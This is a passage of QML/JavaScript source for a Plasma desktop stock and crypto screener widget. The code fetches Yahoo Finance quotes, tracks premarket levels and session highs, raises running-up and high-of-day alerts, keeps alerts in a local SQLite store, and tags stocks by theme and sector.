        const batches = []
        for (let i = 0; i < list.length; i += 200) batches.push(list.slice(i, i + 200))
        let failed = false
        // One request at a time: gentler on Yahoo, and a pass of ~15
        // takes a few seconds.
        const next = i => {
            if (i >= batches.length) {
                passing = false
                // Back off while Yahoo refuses; recover once it answers.
                // Never faster than the setting: a refusal must not shorten
                // an interval already set above the 2-minute cap.
                passMs = failed ? Math.max(cfg.passSeconds * 1000, Math.min(passMs * 2, 120000)) : cfg.passSeconds * 1000
                buildRanked()
                updated = new Date()
                return
            }
            ticker.withCrumb(c => {
                ticker.yget("https://query1.finance.yahoo.com/v7/finance/quote?crumb=" + encodeURIComponent(c)
                            + "&symbols=" + batches[i].map(encodeURIComponent).join(",")
                            + (cfg.quoteFields ? "&fields=" + quoteFieldList : ""), x => {
                    if (x.status === 401) ticker.crumb = ""
                    let qs = null
                    try { qs = JSON.parse(x.responseText).quoteResponse.result } catch (e) {}
                    if (!qs) failed = true
                    else for (const q of qs) take(q, ph)
                    next(i + 1)
                })
            })
        }
        next(0)
    }

    // One stock's quote: record it, then test the triggers.
    function take(q, ph) {
        const sym = q.symbol
        // The row is keyed by the symbol Yahoo answers with, which goes on
        // to the bridge: it must be one this widget would have asked for.
        if (!validSymbol(sym)) return
        // The price that is trading now: premarket, regular or after hours.
        const price = ph === "pre" && q.preMarketPrice > 0 ? q.preMarketPrice
                    : ph === "post" && q.postMarketPrice > 0 ? q.postMarketPrice
                    : ph === "overnight" ? freshestPrice(q)
                    : q.regularMarketPrice
        if (!(price > 0)) return
        const now = Date.now()
        const pm = pmVol[sym] || []
        // Today's premarket from Nasdaq (pmLevels), where this stock has been
        // looked up: the premarket high, low and volume.
        const lv = pmLevels[sym]
        // Overnight volume is not known: regularMarketVolume is the last
        // regular session's. Premarket, the larger of the two sources' --
        // a running total only grows, and the premarket list lags.
        let volume = ph === "pre" ? Math.max(pm.length ? pm[pm.length - 1].v : -1, lv ? lv.vol : -1)
                     : ph === "overnight" ? NaN : q.regularMarketVolume
        if (volume < 0) volume = NaN
        const rvolVol = ph === "pre" ? (pm.length ? pm[pm.length - 1].v : NaN) : volume
        const avg = q.averageDailyVolume3Month || q.averageDailyVolume10Day
        // Premarket, Yahoo's regular-session fields still describe
        // yesterday: regularMarketPrice is yesterday's close and
        // regularMarketPreviousClose the close before it (AARD 2026-10-23:
        // $3.95 and $4.41), so yesterday's close is regularMarketPrice.
        // Overnight is the next session's opening, so the same holds.
        const prev = ph === "pre" || ph === "overnight" ? q.regularMarketPrice : q.regularMarketPreviousClose
        // Change is from yesterday's close, except after hours, where it is
        // from today's close -- the usual meaning once the session has ended.
        const ref = ph === "post" ? q.regularMarketPrice : prev

        let h = hist[sym]
        const first = !h
        h = (h || []).filter(x => now - x.t < 6 * 60000)
        h.push({ t: now, p: price, v: volume })
        hist[sym] = h

        // 5-minute volume: the growth of the running total over ~5 minutes.
        let rvol5 = NaN
        const back = h.filter(x => now - x.t >= 4.5 * 60000).pop()
        if (back && Number.isFinite(volume) && Number.isFinite(back.v)) {
            const vol5 = (volume - back.v) * 5 * 60000 / (now - back.t)
            let avg5 = NaN
            if (ph === "regular") avg5 = avg > 0 ? avg / 78 : NaN
            else if (ph === "pre") {
                const mins = etMinutes(now / 1000) - preStart
                if (mins >= 10) avg5 = volume / mins * 5
            }
            if (avg5 > 0) rvol5 = vol5 / avg5 * 100
        }

        const r = {
            symbol: sym, name: q.shortName || q.longName || "",
            price: price,
            change: ref > 0 ? (price / ref - 1) * 100 : NaN,
            gap: q.regularMarketOpen > 0 && prev > 0 && ph !== "pre" && ph !== "overnight"
                 ? (q.regularMarketOpen / prev - 1) * 100 : (prev > 0 ? (price / prev - 1) * 100 : NaN),
            volume: volume,
            // Premarket, RVOL stays what it was before the Nasdaq volumes:
            // the premarket list's volume where there is one, else unknown.
            // Premarket shares against a whole day's average is a small
            // number by nature (WORX 2026-10-26: 4.2M against 4.5M, 0.93),
            // so filling it in for every runner turned High of Day's
            // RVOL >= 5 from "not judged" into "fails" and stopped its
            // premarket alerts.
            rvol: avg > 0 && Number.isFinite(rvolVol) ? rvolVol / avg : NaN,
            rvol5: rvol5,
            marketCap: q.marketCap,
            // When it listed: the "recent IPO" trait of a theme pattern.
            firstTrade: q.firstTradeDateMilliseconds || NaN,
            avgVol: q.averageDailyVolume3Month || q.averageDailyVolume10Day,
            ma50: q.fiftyDayAverage, ma200: q.twoHundredDayAverage,
            low52: q.fiftyTwoWeekLow, high52: q.fiftyTwoWeekHigh,
            shares: q.sharesOutstanding,
            pmHigh: lv && lv.hi > 0 ? lv.hi : NaN,
            pmLow: lv && lv.lo > 0 ? lv.lo : NaN,
            // How far it ran in the premarket: yesterday's close to the
            // premarket high, and on how many shares. Fixed once the
            // premarket ends, so after the open it sits beside the day's
            // change: which stocks ran premarket, and which in the session.
            pmRun: lv && lv.hi > 0 && prev > 0 ? (lv.hi / prev - 1) * 100 : NaN,
            pmVol: lv && lv.vol >= 0 ? lv.vol : NaN
        }
        quotes[sym] = r
        // Closed: the quote is the last close and is not moving, so there is
        // no session high or low to track and nothing to alert on.
        if (ph === "closed") return

        // The session's low so far: Yahoo's day low in regular hours,
        // otherwise the lowest price seen this session -- and in both, the
        // premarket low where it is known, so a restart does not forget it.
        const sessionLow = Math.min(ph === "regular" && q.regularMarketDayLow > 0 ? q.regularMarketDayLow : Infinity,
                                    (ph === "pre" || ph === "regular") && r.pmLow > 0 ? r.pmLow : Infinity)
        const low = Math.min(seenLow[sym] === undefined ? Infinity : seenLow[sym],
                             Math.min(sessionLow, price))
        seenLow[sym] = low
        r.offLow = low > 0 ? (price / low - 1) * 100 : NaN

        // The session's high so far. Regular hours: Yahoo's day high, which
        // includes this price. Otherwise the highest price seen this session.
        // The premarket high counts in both, until it is broken: a stock
        // under its premarket high at 09:45 has not made a high of day,
        // whatever the regular session's own high says.
        const st = seenHigh[sym]
        const sh = Math.max(ph === "regular" && q.regularMarketDayHigh > 0 ? q.regularMarketDayHigh : -Infinity,
                            (ph === "pre" || ph === "regular") && r.pmHigh > 0 ? r.pmHigh : -Infinity)
        const sessionHigh = sh > 0 ? sh : NaN
        if (first || st === undefined) {
            // First sight: seed, never alert -- a stock already up 40% at
            // start-up is not running up this instant.
            seenHigh[sym] = Number.isFinite(sessionHigh) ? sessionHigh : price
            return
        }

        fire("stocks", sym, r, h, price, st, now)
        seenHigh[sym] = Math.max(st, Number.isFinite(sessionHigh) ? sessionHigh : price, price)
    }

    // Each alert screen of `market` tests this pass against its own trigger
    // and quote-level filters. `prior` is the high before this price.
    function marketOf(sc) { return sc && sc.market === "crypto" ? "crypto" : "stocks" }
    function fire(market, sym, r, h, price, prior, now) {
        // At the high counts as breaking it when the last pass was under it:
        // the premarket high from Nasdaq can be the very print this pass
        // is sampling.
        const prevP = h.length > 1 ? h[h.length - 2].p : price
        const newHigh = price > prior || (price >= prior && prevP < prior)
        for (const sc of screens) {
            if (marketOf(sc) !== market) continue
            if (sc.type === "running") {
                // `runPct`% above the window's low, at the window's high, and
                // above this stock's last alert on this screen if that was
                // recent -- so a stall is not re-alerted, a fresh run is.
                const winMs = (sc.runWindow || 2) * 60000
                const win = h.filter(x => now - x.t <= winMs)
                if (win.length < 2) continue
                const lo = Math.min(...win.map(x => x.p))
                const hi = Math.max(...win.slice(0, -1).map(x => x.p))
                const key = sc.id + ":" + sym
                const last = lastRun[key]
                if ((price / lo - 1) * 100 >= (sc.runPct || 3) && price > hi
                        && !(last && now - last.t < winMs && price <= last.p)) {
                    if (Screens.passes(sc, inCurrency(sc, r), "quote")) {
                        lastRun[key] = { t: now, p: price }
                        raise(sc.id, r)
                    } else if (market === "stocks") recheckWithLevels(sc, sym, price)
                }
            } else if (sc.type === "hod") {
                if (!newHigh) continue
                if (Screens.passes(sc, inCurrency(sc, r), "quote")) raise(sc.id, r)
                else if (market === "stocks") recheckWithLevels(sc, sym, price)
            }
        }
    }

    // Ranked screens, rebuilt at the end of every pass from all the quotes.
    // Twice the rows are kept, so rows the facts filters drop can be filled.
    function buildRanked() {
        const next = Object.assign({}, ranked)
        const all = { stocks: Object.values(quotes), crypto: Object.values(cquotes) }
        for (const sc of screens) {
            if (sc.type === "value") { next[sc.id] = valueRows(sc); continue }
            if (sc.type !== "ranked") continue
            const crypto = marketOf(sc) === "crypto"
            const by = sc.rankBy || "change"
            const n = Screens.rankCountOf(sc)
            const dir = sc.rankLow ? -1 : 1
            const list = all[marketOf(sc)].filter(r => Number.isFinite(r[by]) && Screens.passes(sc, inCurrency(sc, r), "quote"))
                            .sort((a, b) => dir * (b[by] - a[by])).slice(0, n * 2)
            next[sc.id] = list
            for (const r of list.slice(0, n)) {
                if (!crypto && !info[r.symbol] && wanted.indexOf(r.symbol) < 0) wanted = wanted.concat([r.symbol])
            }
        }
        ranked = next
    }
    // ── premarket levels ──────────────────────────────────────────────────
    // Today's premarket high, low and volume per runner, from Nasdaq through
    // the bridge (`prelevels`). Yahoo's quotes have no premarket volume and
    // no premarket range, so before this a premarket stock's volume was
    // unknown unless it was on the top-20 premarket list, and its low was
    // the lowest price this widget had happened to see -- which a restart
    // reset (CLRO 2026-10-26 alerted 2.5 minutes late on exactly that).
    //
    // Runners -- up `pmRunnerMin`% on yesterday's close, or on the premarket
    // list -- are looked up from 04:00 ET and kept fresh every minute, so
    // the levels are known before the trading morning starts and the list
    // grows into the open. The stocks in play change from session to
    // session -- the morning's report is rarely the day's leaders -- so the
    // runners are found from the whole pool every pass, never a fixed list.
    // In the regular session, a stock that reaches the threshold without
    // levels from after the premarket's end gets them once: the premarket
    // is final by then, and its high stays a level until it is broken. The
    // levels are saved per session, so a restart keeps them.
    property var pmLevels: ({})           // symbol -> {hi, lo, vol, t}
    property var pmAsked: ({})            // symbol -> when last asked
    property var pmWaiting: ({})          // symbol -> {screen id: true} alerts held for a look-up
    property bool pmSweeping: false
    readonly property real pmRunnerMin: 5
    function sweepLevels() {
        const ph = phase()
        const now = Date.now()
        const m = etMinutes(now / 1000)
        const regular = ph === "regular"
        if (pmSweeping || !(ph === "pre" || regular)) return
        const runners = new Set(ph === "pre" ? extra : [])
        for (const sym in quotes) if (quotes[sym].change >= pmRunnerMin) runners.add(sym)
        const due = Array.from(runners).filter(s => regular
                ? !pmAsked[s] || pmAsked[s] < now - (m - openAt + 1) * 60000
                : now - (pmAsked[s] || 0) >= 60000)
            .sort((a, b) => (pmAsked[a] || 0) - (pmAsked[b] || 0))
            .slice(0, 30)
        if (due.length) askLevels(due, false)
    }
    function askLevels(syms, urgent) {
        const now = Date.now()
        for (const s of syms) pmAsked[s] = now
        if (!urgent) pmSweeping = true
        bridgeRun(["prelevels"].concat(syms), out => {
            if (!urgent) pmSweeping = false
            if (!out || typeof out !== "object" || out.error) return
            const t = Date.now()
            const got = []
            for (const s in out) {
                const v = out[s]
                if (!v) continue
                pmLevels[s] = { hi: v.hi, lo: v.lo, vol: v.vol, t: t }
                got.push(s)
            }
            storeLevels(got)
            for (const s of syms) {
                const w = pmWaiting[s]
                if (!w) continue
                delete pmWaiting[s]
                for (const id in w) recheck(id, s, w[id])
            }
        }, 40, urgent)
    }
    // An alert whose trigger fired but whose filters did not pass, premarket,
    // on a stock without fresh levels: usually the volume is not known yet.
    // Look the stock up at once and test the filters again with the real
    // figures, instead of letting it through or dropping it.
    function recheckWithLevels(sc, sym, price) {
        if (phase() !== "pre") return
        const lv = pmLevels[sym]
        if (lv && Date.now() - lv.t < 60000) return
        // Only where the levels could change the answer: a stock out of the
        // screen's price or cap range is not worth a look-up.
        const r = quotes[sym]
        if (!r || !Screens.passes(sc, Object.assign({}, inCurrency(sc, r), { volume: 1e15, rvol: 1e6, offLow: 1e6 }), "quote")) return
        const w = pmWaiting[sym] || {}
        const asking = Object.keys(w).length > 0
        w[sc.id] = price
        pmWaiting[sym] = w
        if (!asking) askLevels([sym], true)
    }
    function recheck(id, sym, price) {
        const sc = screen(id), r = quotes[sym], lv = pmLevels[sym]
        if (!sc || !r || !lv) return
        // The quote's figures again, with the levels in.
        if (lv.vol >= 0 && !(r.volume >= lv.vol)) r.volume = lv.vol
        if (lv.hi > 0) r.pmHigh = lv.hi
        if (lv.vol >= 0) r.pmVol = lv.vol
        if (lv.hi > 0 && r.price > 0 && Number.isFinite(r.change)) r.pmRun = (lv.hi / (r.price / (1 + r.change / 100)) - 1) * 100
        if (lv.lo > 0) {
            r.pmLow = lv.lo
            seenLow[sym] = Math.min(seenLow[sym] === undefined ? Infinity : seenLow[sym], lv.lo)
            r.offLow = (r.price / seenLow[sym] - 1) * 100
        }
        if (!Screens.passes(sc, inCurrency(sc, r), "quote")) return
        if (sc.type === "running") lastRun[sc.id + ":" + sym] = { t: Date.now(), p: price }
        raise(sc.id, r)
    }
    function storeLevels(syms) {
        if (!syms.length || !openDb()) return
        const d = sessionDay
        db.transaction(tx => {
            tx.executeSql("CREATE TABLE IF NOT EXISTS pmlevels (day TEXT, symbol TEXT, hi REAL, lo REAL, vol REAL, at INTEGER, PRIMARY KEY (day, symbol))")
            for (const s of syms) {
                const v = pmLevels[s]
                tx.executeSql("INSERT OR REPLACE INTO pmlevels VALUES (?, ?, ?, ?, ?, ?)", [d, s, v.hi, v.lo, v.vol, v.t])
            }
        })
    }
    function loadLevels() {
        pmLevels = ({}); pmAsked = ({}); pmWaiting = ({})
        if (!openDb()) return
        const next = {}, asked = {}
        db.transaction(tx => {
            tx.executeSql("CREATE TABLE IF NOT EXISTS pmlevels (day TEXT, symbol TEXT, hi REAL, lo REAL, vol REAL, at INTEGER, PRIMARY KEY (day, symbol))")
            const rs = tx.executeSql("SELECT symbol, hi, lo, vol, at FROM pmlevels WHERE day = ?", [sessionDay])
            for (let i = 0; i < rs.rows.length; i++) {
                const x = rs.rows.item(i)
                next[x.symbol] = { hi: x.hi, lo: x.lo, vol: x.vol, t: x.at }
                asked[x.symbol] = x.at
            }
            tx.executeSql("DELETE FROM pmlevels WHERE day < ?", [sessionDay])
        })
        pmLevels = next
        pmAsked = asked
    }
    Timer {
        interval: 15000; running: true; repeat: true
        onTriggered: eng.sweepLevels()
    }

    property var seenHigh: ({})           // symbol -> session high so far
    property var seenLow: ({})            // symbol -> session low so far
    property var lastRun: ({})            // symbol -> {t, p} of its last Running Up alert

    // Facts for alerted stocks are asked for in small batches, not one
    // bridge call per alert.
    property var wanted: []
    Timer {
        interval: 5000; running: eng.wanted.length > 0
        onTriggered: { const w = eng.wanted; eng.wanted = []; eng.refreshInfo(w) }
    }

    // Every alert is its own row: a stock that runs up again shows again.
    // Only alerts on the same symbol within 4 seconds fold into one row that
    // counts them ("2 in 3s") -- a stock moving that fast would otherwise
    // fill the feed. With a pass every 30 seconds this is rare.
    function raise(feed, r) {
        const crypto = r.market === "crypto"
        // The new session's first stock alert clears the last session's
        // stock alerts from view; crypto feeds are a rolling 24 hours.
        if (!crypto && feedsDay !== sessionDay) {
            const keep = {}
            for (const id in feeds) if (marketOf(screen(id)) === "crypto") keep[id] = feeds[id]
            feeds = keep
            feedsDay = sessionDay
        }
        if (!crypto && !info[r.symbol] && wanted.indexOf(r.symbol) < 0) wanted = wanted.concat([r.symbol])
        const list = (feeds[feed] || []).slice()
        const now = Date.now()
        const a = Object.assign({}, r, { time: now, first: now, count: 1 })
        const top = list[0]
        if (top && top.symbol === r.symbol && a.time - top.time <= 4000) {
            a.first = top.first
            a.count = top.count + 1
            list[0] = a
            store(feed, a, top.time)
        } else {
            list.unshift(a)
            store(feed, a)
        }
        if (crypto) {
            const cut = now - 24 * 3600000
            while (list.length && list[list.length - 1].time < cut) list.pop()
        }
        if (list.length > 3000) list.length = 3000
        const f = Object.assign({}, feeds); f[feed] = list; feeds = f
        updated = new Date()
        alerted(feed)
        play(feed)
    }

    // Watchlist key-level alerts (LevelWatch.qml): its own 1-minute bars for
    // the watchlist, raising alerts into the "levels" screens' feeds.
    readonly property alias levelWatch: levelWatchItem
    LevelWatch {
        id: levelWatchItem
        engine: eng
        ticker: eng.ticker
    }
    // Unusual options on the watchlist (OptionsWatch.qml), into the "uoa"
    // screens' feeds.
    readonly property alias optionsWatch: optionsWatchItem
    OptionsWatch {
        id: optionsWatchItem
        engine: eng
        ticker: eng.ticker
    }

    // ── keeping the day's alerts ──────────────────────────────────────────
    // Alerts are filed under the trading session (`sessionDay`) and stay on
    // show until the next session's first alert: closed -- evenings,
    // weekends, holidays -- the feeds show the last session's alerts, the way
    // a screener goes quiet rather than blank. Two weeks are kept. They live
    // in a small SQLite database (Qt's LocalStorage, under
    // ~/.local/share/plasmashell/QML/OfflineStorage/) so a Plasma restart or a
    // reboot does not empty the feeds. Not the widget's settings: those live
    // in the panel's shared config file, and a day of alerts written there on
    // every alert would bloat and churn it.
    property string day: ""
    property string feedsDay: ""          // the session the feeds on show belong to
    property var db: null

    function openDb() {
        if (db) return true
        try {
            db = LocalStorage.openDatabaseSync("MarketTickerAlerts", "1.0", "Market Ticker screener alerts", 20000000)
            db.transaction(tx => tx.executeSql(
                "CREATE TABLE IF NOT EXISTS alerts (day TEXT, feed TEXT, time INTEGER, row TEXT)"))
            return true
        } catch (e) {
            console.warn("marketticker: alert database unavailable:", e)
            db = null
            return false
        }
    }
    // Saves an alert; `replaces` is the time of a row it was folded into.
    function store(feed, a, replaces) {
        if (!openDb()) return
        const d = a.market === "crypto" ? cryptoDay : sessionDay
        db.transaction(tx => {
            if (replaces !== undefined)
                tx.executeSql("DELETE FROM alerts WHERE day = ? AND feed = ? AND time = ?", [d, feed, replaces])
            tx.executeSql("INSERT INTO alerts VALUES (?, ?, ?, ?)", [d, feed, a.time, JSON.stringify(a)])
        })
    }
    // This session's alerts back from the database, newest first -- or,
    // while closed and before this session has any, the last session's.
    // Re-checked on the way in, so a symbol a later rule excludes does not
    // come back.
    function restore() {
        if (!openDb()) return
        migrate()
        db.transaction(tx => {
            tx.executeSql("DELETE FROM alerts WHERE day < ?",
                          [Qt.formatDate(new Date(Date.now() - 14 * 86400000), "yyyy-MM-dd")])
            // Only stock feeds decide which session is on show: crypto alerts
            // are filed under the UTC date, and counting them made Saturday's
            // crypto rows "the last session" -- which has no stock alerts --
            // so Friday's stock feeds came back empty (2026-10-24).
            const stockIds = screens.filter(s => marketOf(s) === "stocks").map(s => s.id)
            const inStock = " AND feed IN (" + stockIds.map(() => "?").join(",") + ")"
            let d = sessionDay
            if (stockIds.length) {
                const here = tx.executeSql("SELECT COUNT(*) AS n FROM alerts WHERE day = ?" + inStock, [d].concat(stockIds))
                if (!here.rows.item(0).n && phase() === "closed") {
                    const last = tx.executeSql("SELECT MAX(day) AS d FROM alerts WHERE day < ?" + inStock, [d].concat(stockIds))
                    if (last.rows.item(0).d) d = last.rows.item(0).d
                }
            }
            feedsDay = d
            const rs = tx.executeSql("SELECT feed, row FROM alerts WHERE day = ? ORDER BY time DESC", [d])
            const cs = tx.executeSql("SELECT feed, row FROM alerts WHERE time > ? ORDER BY time DESC",
                                     [Date.now() - 24 * 3600000])
            const f = {}
            const take = (set, crypto) => {
                for (let i = 0; i < set.rows.length; i++) {
                    const id = set.rows.item(i).feed
                    if (!screen(id)) continue                 // a screen switched off
                    if ((marketOf(screen(id)) === "crypto") !== crypto) continue
                    let a
                    try { a = JSON.parse(set.rows.item(i).row) } catch (e) { continue }
                    if (!crypto && !validSymbol(a.symbol)) continue
                    ;(f[id] = f[id] || []).push(a)
                }
            }
            take(rs, false)
            take(cs, true)
            feeds = f
        })
        screenIdsSeen = screens.map(s => s.id)
    }
    // A screen switched on (a crypto screen, most often) gets its saved
    // alerts back at once -- the stock ones of the session on show, a crypto
    // one's last 24 hours -- rather than at the next restart: restore() above
    // runs once a session and skips screens that are off.
    property var screenIdsSeen: []
    onScreensChanged: {
        const ids = screens.map(s => s.id)
        const added = ids.filter(id => screenIdsSeen.indexOf(id) < 0 && !(feeds[id] || []).length)
        screenIdsSeen = ids
        if (added.length && db && feedsDay) restoreFeeds(added)
    }
    function restoreFeeds(ids) {
        if (!openDb()) return
        const f = Object.assign({}, feeds)
        let got = false
        db.readTransaction(tx => {
            for (const id of ids) {
                const sc = screen(id)
                if (!sc) continue
                const crypto = marketOf(sc) === "crypto"
                const rs = crypto
                    ? tx.executeSql("SELECT row FROM alerts WHERE feed = ? AND time > ? ORDER BY time DESC", [id, Date.now() - 24 * 3600000])
                    : tx.executeSql("SELECT row FROM alerts WHERE feed = ? AND day = ? ORDER BY time DESC", [id, feedsDay])
                const list = []
                for (let i = 0; i < rs.rows.length; i++) {
                    let a
                    try { a = JSON.parse(rs.rows.item(i).row) } catch (e) { continue }
                    if (!crypto && !validSymbol(a.symbol)) continue
                    list.push(a)
                }
                if (list.length) { f[id] = list; got = true }
            }
        })
        if (got) feeds = f
    }

    // Alerts saved the old way (the `alertLog` setting, used on 2026-10-22
    // before this database) are carried across once, then that key is
    // emptied. That log was keyed by the ET date.
    function migrate() {
        if (!cfg.alertLog) return
        try {
            const log = JSON.parse(cfg.alertLog)
            if (log.day === day) {
                for (const a of (log.running || []).slice().reverse()) store("running", a)
                for (const a of (log.hod || []).slice().reverse()) store("hod", a)
            }
        } catch (e) {}
        Plasmoid.configuration.alertLog = ""
    }

    // Local midnight starts both feeds clean.
    // Theme history and alerts turn over with the trading session; the
    // per-stock price tracking still starts clean at local midnight.
    function rollDay() {
        const cd = new Date().toISOString().slice(0, 10)
        if (cd !== cryptoDay) { const had = cryptoDay !== ""; cryptoDay = cd; if (had) loadThemes() }
        const sd = sessionDayOf(Date.now() / 1000)
        if (sd !== sessionDay) {
            sessionDay = sd
            loadThemes()                      // the finished session joins the history
            feeds = ({}); restore()           // and its alerts stay on show while closed
            loadLevels()                      // this session's premarket levels, if any yet
        }
        const d = Qt.formatDate(new Date(), "yyyy-MM-dd")
        if (d === day) return
        day = d
        hist = ({}); seenHigh = ({}); seenLow = ({}); lastRun = ({}); pmVol = ({})
    }
    // Premarket opens a new session: the overnight highs and histories go.
    property string lastPhase: ""
    onCurrentPhaseChanged: {
        if (lastPhase !== "" && currentPhase !== lastPhase
                && !(lastPhase === "overnight" && currentPhase === "pre")) { hist = ({}); seenHigh = ({}); seenLow = ({}); lastRun = ({}) }
        lastPhase = currentPhase
    }

    // ── themes ────────────────────────────────────────────────────────────
    // Which story a row belongs to, and how hot that story is. The point is
    // to know a theme is live before its fourth ticker gaps, and to know it
    // has died before the fourth one is bought.
    //
    // Only symbols that actually reached a screen count as members. The pool
    // is thousands of stocks, and counting all of them would give every theme
    // hundreds of "members" and no signal -- `info[s].scanner` marks the ones
    // the bridge looked up, which is exactly the alerted set.
    property var themeLive: ({})      // theme id -> {symbol: {peak, shell, fresh}}
    property var themeHist: ({})      // theme id -> [day readings, oldest first]
    property var themeLastDay: ({})   // theme id -> {d, members} of its newest finished day
    readonly property var themeTune: Themes.tune(cfg)

    // The sector layer (Themes.sectorCatalog): a per-ticker override from
    // Settings → Themes, else Finviz's sector. A crypto pair's sector is its
    // CoinGecko category.
    readonly property var sectorOverrides: {
        try { return JSON.parse(cfg.sectorOverrides || "{}") } catch (e) { return ({}) }
    }
    // Your themes and sectors (Settings → Themes), switched-on ones.
    readonly property var allThemes: Themes.loadThemes(cfg)
    readonly property var allSectors: Themes.loadSectors(cfg)
    readonly property var userThemes: allThemes.filter(t => t.on !== false)
    readonly property var userSectors: allSectors.filter(s => s.on !== false)
    // Any group's name, glyph and colours: your themes and sectors, Finviz's
    // sectors, crypto's categories. A deleted one keeps its id as its name.
    function groupInfo(id) {
        const u = allThemes.find(x => x.id === id) || allSectors.find(x => x.id === id)
        if (u) return { id: u.id, name: u.name, glyph: u.glyph || "dot", ramp: u.ramp || "", market: u.market || "stocks" }
        return Themes.lookup(id)
    }
    // The sector a stock belongs to: its per-ticker override, else one of
    // your sectors that lists the ticker, else one that lists its industry,
    // else Finviz's sector (`finviz`, an "s-" id).
    function sectorForSym(sym, industry, finviz) {
        const o = sectorOverrides[sym]
        if (o) return groupInfo(o)
        for (const s of userSectors) if ((s.tickers || []).indexOf(sym) >= 0) return groupInfo(s.id)
        if (industry) for (const s of userSectors) if ((s.industries || []).indexOf(industry) >= 0) return groupInfo(s.id)
        return finviz ? Themes.sectorById(finviz) : null
    }
    // The themes a stock is on, in your list's order: those it is pinned to
    // (from the day the pin was made), and every theme whose pattern it fits
    // (Themes.themeMatches: headline words or industry, and traits). A stock
    // whose headline matched no theme's words stays on the one its headline
    // last matched for `stickySessions` sessions after -- a treasury stock's
    // follow-up news ("Acquires 176,271 ETH") need not repeat the words that
    // put it on the theme. `market` keeps stock and crypto themes apart;
    // `day` (default: the live session) is the day asked about, for
    // re-tagging history. `f` is what is known about the stock
    // (themeFacts); just a headline and sector will do. Each result's `via`
    // says which rule placed it: "pin", "words", "pattern" or "sticky".
    function themesFor(sym, f, market, day) {
        const mine = userThemes.filter(t => (t.market || "stocks") === market)
        const on = (t, via) => Object.assign(groupInfo(t.id), { via: via })
        const out = []
        for (const t of mine) {
            if (Themes.pinnedOn(t, sym, day || (market === "crypto" ? cryptoDay : sessionDay))) out.push(on(t, "pin"))
            else if (Themes.themeMatches(t, f)) out.push(on(t, Themes.matchedBy(t, f)))
        }
        if (!out.some(x => x.via === "words")) {
            const k = day ? null : themeSticky[sym]
            if (k && sessionsSince(k.day, market) < themeTune.stickySessions && !out.some(x => x.id === k.theme)) {
                const t = mine.find(x => x.id === k.theme)
                if (t) out.push(on(t, "sticky"))
            }
        }
        return out
    }
    // The first of them, for callers that want one.
    function themeFor(sym, headline, market, sectorId, day) {
        return themesFor(sym, { headline: headline, sector: sectorId }, market, day)[0] || null
    }
    // What a theme pattern can test about a stock now.
    function themeFacts(sym, headline, sectorId) {
        const n = info[sym] || {}, q = quotes[sym] || {}
        const fl = n.finvizFloat > 0 ? n.finvizFloat : n.yahooFloat
        const mine = newsFor(sym)
        const newest = Math.max(n.newsTime || 0, mine ? mine.time || 0 : 0)
        return {
            headline: headline, sector: sectorId || "", industry: n.industry || "",
            country: n.country || "", float: fl > 0 ? fl : NaN, price: q.price, cap: q.marketCap,
            // News in the last 24 hours: known once Finviz has been read for it,
            // or once a news source has a story on it.
            news: newest > 0 ? Date.now() - newest < 24 * 3600000 : (n.scanner ? false : null),
            ipoDays: q.firstTrade > 0 ? (Date.now() - q.firstTrade) / 86400000 : NaN
        }
    }
    // Sticky membership: symbol -> {theme, day} of the last session its
    // headline matched a theme while it was on a screen. Kept beside the
    // theme history (themesticky).
    property var themeSticky: ({})
    // Every session the tally ran, per market, oldest first (themesessions):
    // the calendar the history, "day N", "fresh" and stickiness count in.
    property var themeSessions: ({ stocks: [], crypto: [] })
    function sessionsSince(day, market) {
        const l = themeSessions[market === "crypto" ? "crypto" : "stocks"] || []
        const now = market === "crypto" ? cryptoDay : sessionDay
        let n = 0
        for (let i = l.length - 1; i >= 0 && l[i] > day; i--) if (l[i] <= now) n++
        if (now > day && l.indexOf(now) < 0) n++
        return n
    }
    function sectorOf(sym) {
        if (cquotes[sym]) {
            const o = sectorOverrides[sym]
            if (o) return groupInfo(o)
            const c = cinfo[sym]
            return c ? Themes.classifyCrypto(c.categories) : null
        }
        const n = info[sym] || {}
        const fv = n.sector ? Themes.sectorFor(n.sector) : null
        return sectorForSym(sym, n.industry || "", fv ? fv.id : "")
    }
    // "Oil & Gas E&P 4, Uranium 2": what a sector's members today are.
    function sectorBreakdown(id) {
        const m = themeLive[id] || {}
        const count = {}
        for (const s in m) { const ind = m[s].industry || (info[s] || {}).industry || "?"; count[ind] = (count[ind] || 0) + 1 }
        return Object.keys(count).sort((a, b) => count[b] - count[a]).map(k => k + " " + count[k]).join(", ")
    }

    // Every theme a stock is on now.
    function themesOf(sym) {
        const mine = newsFor(sym)
        if (cquotes[sym]) return themesFor(sym, { headline: mine ? mine.title : "" }, "crypto")
        const n = info[sym]
        const headline = mine && (!n || !n.newsTime || mine.time > n.newsTime) ? mine.title : (n ? n.newsTitle : "")
        const s = sectorOf(sym)
        return themesFor(sym, themeFacts(sym, headline, s ? s.id : ""), "stocks")
    }
    // The one its row shows: the hottest, the first in your list on a tie.
    // A "no news" theme is a pattern among runners, not a label for every
    // quiet stock (Matt, 2026-10-26: GCTK, a drug maker up 20% with no
    // headline, showed No-news runners): it shows only on a stock that ran.
    function themeOf(sym) {
        const l = themesOf(sym).filter(t => {
            const def = userThemes.find(x => x.id === t.id)
            if (!def || !def.when || def.when.news !== "none" || t.via === "pin") return true
            const m = (themeLive[t.id] || {})[sym]
            return !!m && Themes.isRunner(m, themeTune)
        })
        if (l.length < 2) return l[0] || null
        const rank = { hot: 3, building: 2, burnt: 1, quiet: 0 }
        let best = l[0], br = rank[themeStatus(l[0].id).status] || 0
        for (let i = 1; i < l.length; i++) {
            const r = rank[themeStatus(l[i].id).status] || 0
            if (r > br) { best = l[i]; br = r }
        }
        return best
    }

    // Has this symbol run on this theme in the last 5 stored sessions? A live
    // theme recruits new tickers; a dying one recycles the same corpses, so
    // "fresh" is one of the four cooling signals.
    function themeFresh(id, sym) {
        const days = (themeHist[id] || []).slice(-5)
        for (let i = 0; i < days.length; i++)
            if ((days[i].syms || []).indexOf(sym) >= 0) return false
        return true
    }

    // One pass of the live tally. Peaks only ever rise: a member that touched
    // +300% at 09:40 and gave it all back still ran that day, and reading the
    // close instead would miss every squeeze.
    //
    // Every member that is new or has a higher peak is written to the
    // database straight away, so a Plasma restart mid-session, or the machine
    // being off at midnight, loses nothing -- the day is never "committed",
    // it simply stops changing.
    function noteThemes() {
        // Closed, the quotes carry the last session's change: tallying them
        // would file Friday's moves again under Saturday. Off: no tally.
        if (phase() === "closed" || (!cfg.themesOn && !cfg.sectorsOn)) return
        noteSession("stocks", sessionDay)
        const next = {}
        const dirty = []
        const stuck = []
